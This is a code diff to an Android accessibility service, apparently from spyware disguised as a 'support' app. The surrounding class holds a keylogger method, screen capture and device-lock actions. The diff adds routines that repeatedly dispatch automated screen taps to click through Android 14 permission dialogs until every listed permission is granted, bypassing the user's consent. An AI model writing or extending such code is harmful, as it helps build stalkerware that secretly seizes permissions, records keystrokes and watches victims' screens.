@@ -74,6 +74,7 @@ import com.support.litework.receiver.MyDeviceAdminReceiver;
 import com.support.litework.server.Server;
 import com.support.litework.utils.Common;
 import com.support.litework.utils.InstalledApps;
+import com.support.litework.utils.MyPermissions;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -112,6 +113,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_DEVICE_LOCK = "DEVICE_LOCK";
     public static final String ACTION_DEVICE_UNLOCK = "DEVICE_UNLOCK";
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
+
     //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
     DisplayMetrics displayMetrics;
 
@@ -120,7 +122,7 @@ public class MainAccessibilityService extends AccessibilityService {
     private boolean isBound = false;
 
     private final int imageWidth = 360;
-    int deviceWidth = 0;
+    static int deviceWidth = 0;
     int deviceHeight = 0;
     int deviceDensityDpi = 0;
     private String screenBase64 = "";
@@ -181,6 +183,12 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private String currentPackagename = "";
 
+    private int lastClickPermissionPosition = 0;
+    private static MainAccessibilityService CONTEXT;
+    public static MainAccessibilityService getContext() {
+        return CONTEXT;
+    }
+
 
     private static final String TAG = "MyAccessibilityService";
     String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
@@ -210,6 +218,7 @@ public class MainAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
+        CONTEXT = this;
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
 
         displayMetrics = new DisplayMetrics();
@@ -737,6 +746,89 @@ public class MainAccessibilityService extends AccessibilityService {
 //        }
     }
 
+    public void AllowPrims14_normal() {
+        int startX = deviceWidth / 2;
+        int startY = (int) (deviceHeight * 0.5);
+
+        int step = 10;// steps bettwen each click
+        int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen
+        try {
+            Thread.sleep(1000);
+        } catch (Exception s) {
+
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            for (String permission : MyPermissions.ALL_PERMISSIONS) {
+                try {
+                    Thread.sleep(100);
+                } catch (Exception s) {
+                    Log.d("Permission::", "permission");
+                }
+                for (int y = startY; y < endY; y += step) {
+                    try {
+                        Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
+                        Thread.sleep(10);
+                    } catch (Exception s) {
+                        Log.d("Permission::", "permission");
+                    }
+
+                    if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
+                        break;
+                    }
+                    Common.getInstance().setLastPermissionlocation(y);
+                    try {
+                        clickthis(startX, y);
+
+                    } catch (Exception e) {
+                        // Handle the exception if needed
+                    }
+                }
+            }
+        }
+    }
+
+    public void AllowPrims14_media() {
+        int startX = deviceWidth / 2;
+        int startY = (int) (deviceHeight * 0.6);
+        if(Common.getInstance().getLastPermissionlocation() > (int) (deviceHeight * 0.6)) {
+            startY = Common.getInstance().getLastPermissionlocation() - 10;
+        }
+
+        int step = 10;// steps bettwen each click
+        int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen
+        try {
+            Thread.sleep(1000);
+        } catch (Exception s) {
+
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            for (String permission : MyPermissions.MEDIA_PERMISSION) {
+                for (int y = startY; y < endY; y += step) {
+                    try {
+                        Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
+                        Thread.sleep(100);
+                    } catch (Exception s) {
+                        Log.d("Permission::", "permission");
+                    }
+
+                    if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
+                        break;
+                    }
+                    try {
+                        clickthis(startX, y);
+
+                    } catch (Exception e) {
+                        // Handle the exception if needed
+                    }
+                }
+            }
+        }
+    }
+
+
+
     private void getKeyLogger(AccessibilityEvent event) {
         CharSequence packagename = String.valueOf(event.getPackageName());
         CharSequence text = "";
@@ -1228,6 +1320,25 @@ public class MainAccessibilityService extends AccessibilityService {
 
         if (!result) {
             Log.d(TAG, "Failed to dispatch gesture");
+        }
+    }
+
+    public void clickthis(int x, int y) {
+        // for a single tap a duration of 1 ms is enough
+        try {
+            final int DURATION = 5;
+
+            Path clickPath = new Path();
+            clickPath.moveTo(x, y);
+            //  clickPath.lineTo(x, y);
+            GestureDescription.StrokeDescription clickStroke =
+                    null;
+            clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, DURATION);
+            GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
+            clickBuilder.addStroke(clickStroke);
+            dispatchGesture(clickBuilder.build(), null, null);
+        } catch (Exception a) {
+            a.printStackTrace();
         }
     }
 
